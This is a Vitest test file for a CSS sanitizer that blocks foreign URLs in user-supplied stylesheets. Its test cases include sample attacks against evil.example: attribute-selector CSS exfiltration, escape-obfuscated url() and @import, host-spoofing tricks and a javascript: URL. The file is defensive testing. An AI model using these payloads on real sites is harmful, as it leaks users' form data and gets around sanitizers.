import { describe, it, expect } from "vitest";
import { blockForeignCssUrls, canvasCssAssetHosts, isCanvasCssUrlAllowed } from "../canvasCssUrls";

const ORIGIN = "https://app.buildrick.io";
const STORE = "abc123.public.blob.vercel-storage.com";
const HOSTS = canvasCssAssetHosts(STORE);
const clean = (css: string) => blockForeignCssUrls(css, { origin: ORIGIN, hosts: HOSTS });
const sheet = (css: string) =>
  blockForeignCssUrls(css, { origin: ORIGIN, hosts: HOSTS, keepUrlsInAttributeFreeRules: true });

describe("canvasCssAssetHosts", () => {
  it("adds the media store host only when it has the Blob shape", () => {
    expect(canvasCssAssetHosts(STORE)).toContain(STORE);
    expect(canvasCssAssetHosts("ABC123.public.blob.vercel-storage.com")).toContain(STORE);
    expect(canvasCssAssetHosts(undefined).some((h) => h.includes("blob"))).toBe(false);
    expect(canvasCssAssetHosts("evil.example").includes("evil.example")).toBe(false);
  });
});

describe("isCanvasCssUrlAllowed", () => {
  it.each([
    "/images/a.png",
    "a.png",
    "#filter",
    "https://app.buildrick.io/api/x",
    "data:image/png;base64,AAAA",
    "blob:https://app.buildrick.io/uuid",
    `https://${STORE}/u/1/a.webp`,
    "https://images.unsplash.com/photo-1",
    "https://images.pexels.com/photos/1/a.jpg",
    "https://fonts.googleapis.com/css2?family=Inter",
    "https://fonts.gstatic.com/s/inter/v1/a.woff2",
    "https://fonts.bunny.net/css?family=inter",
    "",
  ])("allows %s", (url) => {
    expect(isCanvasCssUrlAllowed(url, ORIGIN, HOSTS)).toBe(true);
  });

  it.each([
    "https://evil.example/x",
    "//evil.example/x",
    "/\\evil.example/x",
    "http://fonts.gstatic.com/a.woff2",
    "https://attacker.public.blob.vercel-storage.com/a",
    "https://public.blob.vercel-storage.com.evil.example/a",
    "https://evil.example/?https://images.unsplash.com",
    "javascript:alert(1)",
  ])("refuses %s", (url) => {
    expect(isCanvasCssUrlAllowed(url, ORIGIN, HOSTS)).toBe(false);
  });

  it("refuses every Blob store when none is configured", () => {
    expect(isCanvasCssUrlAllowed(`https://${STORE}/a.png`, ORIGIN, canvasCssAssetHosts(undefined))).toBe(false);
  });
});

describe("blockForeignCssUrls", () => {
  it("neutralises the attribute-selector exfiltration shape", () => {
    const css = 'input[value^="a"] { background: url("https://evil.example/leak?a") }';
    expect(clean(css)).toBe('input[value^="a"] { background: url("data:,") }');
  });

  it("handles unquoted, single-quoted and upper-case url()", () => {
    expect(clean("a{b:url(https://evil.example/1)}")).toBe("a{b:url(data:,)}");
    expect(clean("a{b:URL( 'https://evil.example/2' )}")).toBe(`a{b:URL( "data:," )}`);
  });

  it("keeps allowed references byte-for-byte", () => {
    const css = [
      "@import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');",
      ".hero{background-image:url(https://images.unsplash.com/photo-1?w=1600)}",
      `@font-face{font-family:X;src:url("https://${STORE}/u/1/x.woff2") format('woff2')}`,
      ".icon{mask:url(data:image/svg+xml;utf8,%3Csvg%3E%3C/svg%3E)}",
      ".rel{background:url(/img/a.png)}",
      ':root{--brand:#1A56DB} .q::before{content:"\\201C"} .md\\:flex{display:flex}',
    ].join("\n");
    expect(clean(css)).toBe(css);
  });

  it("blocks a foreign @import in both forms", () => {
    expect(clean('@import "https://evil.example/a.css";')).toBe('@import "data:,";');
    expect(clean("@import url(https://evil.example/a.css) screen;")).toBe("@import url(data:,) screen;");
  });

  it("blocks foreign @font-face sources", () => {
    expect(clean("@font-face{font-family:x;src:url(https://evil.example/f.woff2)}")).toBe(
      "@font-face{font-family:x;src:url(data:,)}"
    );
  });

  it("blocks bare strings in image-set(), -webkit-image-set() and src()", () => {
    expect(clean('a{background:image-set("https://evil.example/1x.png" 1x, "/ok.png" 2x)}')).toBe(
      'a{background:image-set("data:," 1x, "/ok.png" 2x)}'
    );
    expect(clean('a{background:-webkit-image-set("https://evil.example/a.png" 1x)}')).toBe(
      'a{background:-webkit-image-set("data:," 1x)}'
    );
    expect(clean('a{background:src("https://evil.example/a.png")}')).toBe('a{background:src("data:,")}');
  });

  it("leaves strings outside fetching functions alone", () => {
    const css = 'a::after{content:"https://evil.example/not-a-request"} b{font-family:"Inter"}';
    expect(clean(css)).toBe(css);
  });

  it("blocks a url() with a comment or modifier after its string", () => {
    expect(clean('a{b:url("https://evil.example/x" /* c */)}')).toBe('a{b:url("data:," /* c */)}');
  });

  describe("tokenizes like the browser", () => {
    it("sees a url after a string that contains a comment opener", () => {
      // A regex comment-stripper reads `/*` inside the string as a comment and
      // swallows the url; the CSS tokenizer does not.
      const css = 'a{content:"/*"} b{background:url(https://evil.example/x)} c{content:"*/"}';
      expect(clean(css)).toBe('a{content:"/*"} b{background:url(data:,)} c{content:"*/"}');
    });

    it("does not see a url inside a real comment as one, and keeps it", () => {
      const css = "/* url(https://evil.example/x) */ a{color:red}";
      expect(clean(css)).toBe(css);
    });

    it("decodes escapes in url values", () => {
      expect(clean("a{b:url(https://ev\\69l.example/x)}")).toBe("a{b:url(data:,)}");
      expect(clean('a{b:url("https://ev\\69l.example/x")}')).toBe('a{b:url("data:,")}');
      // CSS `\\` is a literal backslash, which the URL parser reads as `/`.
      expect(clean("a{b:url(/\\\\evil.example/x)}")).toBe("a{b:url(data:,)}");
    });

    it("blocks a url or string left open at the end of the sheet", () => {
      expect(clean("a{b:url(https://evil.example/x")).toBe("a{b:url(data:,)");
      expect(clean('a{b:url("https://evil.example/x')).toBe('a{b:url("data:,"');
      expect(clean('a{b:image-set("https://evil.example/x')).toBe('a{b:image-set("data:,"');
      expect(clean('@import "https://evil.example/x')).toBe('@import "data:,"');
    });

    it("reads `10url(` as a dimension, `#url(` as a hash", () => {
      const css = "a{b:10url(x) #url(y)}";
      expect(clean(css)).toBe(css);
    });

    it("drops the whole sheet when an escape spells a function name or at-keyword", () => {
      expect(clean("a{b:\\75 rl(https://evil.example/x)} c{color:red}")).toBe("");
      expect(clean("a{b:u\\72l(/ok.png)}")).toBe("");
      expect(clean('@\\69mport "https://evil.example/a.css";')).toBe("");
    });
  });

  it("returns empty input unchanged", () => {
    expect(clean("")).toBe("");
  });
});

describe("blockForeignCssUrls with keepUrlsInAttributeFreeRules (StyleEngine sheet)", () => {
  it("keeps a pasted URL in a rule that tests no attribute value", () => {
    const css = [
      '[data-buildrick-id="el-1"] {\n  background-image: url(https://pasted.example/a.png);\n}',
      '[data-buildrick-id="el-1"]:hover {\n  background-image: url(https://pasted.example/b.png);\n}',
      ".hero .title {\n  background-image: url(https://pasted.example/c.png);\n}",
    ].join("\n\n");
    expect(sheet(css)).toBe(css);
  });

  it("blocks it in a rule that tests an attribute value", () => {
    expect(sheet('input[value^="a"] { background: url(https://evil.example/a) }')).toBe(
      'input[value^="a"] { background: url(data:,) }'
    );
    expect(sheet('[data-buildrick-id="el-1"] input[name] { background: url(https://evil.example/a) }')).toBe(
      '[data-buildrick-id="el-1"] input[name] { background: url(data:,) }'
    );
  });

  it("looks through @media but not into a rule nested in an attribute rule", () => {
    expect(sheet("@media (max-width: 767px) { .a { b: url(https://pasted.example/x) } }")).toBe(
      "@media (max-width: 767px) { .a { b: url(https://pasted.example/x) } }"
    );
    expect(sheet("input[value^=a] { .x { b: url(https://evil.example/x) } }")).toBe(
      "input[value^=a] { .x { b: url(data:,) } }"
    );
    expect(sheet("@scope (form[action^=a]) { .x { b: url(https://evil.example/x) } }")).toBe(
      "@scope (form[action^=a]) { .x { b: url(data:,) } }"
    );
  });

  it("does not let a prelude hide behind a stray `}` or `;`", () => {
    expect(sheet("input[value^=a] } .x { b: url(https://evil.example/x) }")).toBe(
      "input[value^=a] } .x { b: url(data:,) }"
    );
  });

  it("gives a malformed sheet no exemption", () => {
    expect(sheet('.a { content: "open\n} .b { b: url(https://pasted.example/x) }')).toBe(
      '.a { content: "open\n} .b { b: url(data:,) }'
    );
    expect(sheet(".a { b: url(https://pasted.example/x) ")).toBe(".a { b: url(data:,) ");
  });
});
